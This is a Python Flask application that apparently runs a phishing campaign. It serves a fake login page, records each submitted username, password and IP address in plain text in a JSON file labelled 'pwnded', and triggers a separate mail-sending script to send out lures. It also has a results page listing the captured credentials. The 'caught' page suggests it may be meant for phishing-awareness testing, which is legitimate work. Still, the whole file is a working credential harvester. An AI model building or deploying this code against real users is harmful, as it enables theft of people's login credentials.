from flask import Flask, render_template, request, redirect
import subprocess
import os
import json
app = Flask(__name__)

@app.route("/", methods = ["GET", "POST"])
def hello_world():
    if request.method == "POST":
        req = request.form
        login = req["login"]
        psw = req["password"]
        print(req)
        ip = request.environ['REMOTE_ADDR']
        #with open('./data.txt','a') as myfile:
         #   myfile.write(login + '\n')
          #  myfile.write(psw + '\n')
           # myfile.write(ip + '\n')
        with open('./data.json') as f:
            data = json.load(f)
            temp= data["pwnded"]
            new = {"login": login, 
            "psw": psw, 
            "ip":ip}
            temp.append(new)
        with open('./data.json','w') as f:
            json.dump(data, f)

        return redirect("/caught")

    return render_template("login.html")

@app.route("/caught/")
def user_caught():
    return render_template("caught.html")
attack_in_progress = 0
@app.route("/addmail/", methods = ["GET", "POST"])
def add_mail():
    global attack_in_progress
    if request.method == "POST":
        req = request.form
        print(req)
        #subprocess.Popen("python3 ../send_mail.py", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        os.system('python3 ../send_mail.py')
        attack_in_progress = 1
    if attack_in_progress == 1:
        return render_template("progress.html")      
    return render_template("addmail.html")

@app.route("/cont/", methods = ["GET", "POST"])
def attack():
    global attack_in_progress
    if request.method == "POST":
        req = request.form
        print(req)
        attack_in_progress = 0
        return redirect('/result/')
        
    return render_template("progress.html")

@app.route("/result/", methods = ["GET", "POST"])
def summery():
    with open("./data.json") as f:
        data = json.load(f)
        temp = data["pwnded"]
        #print(temp)
    return render_template('record.html', records=temp)
if __name__=="__main__":
    app.run(debug=True)
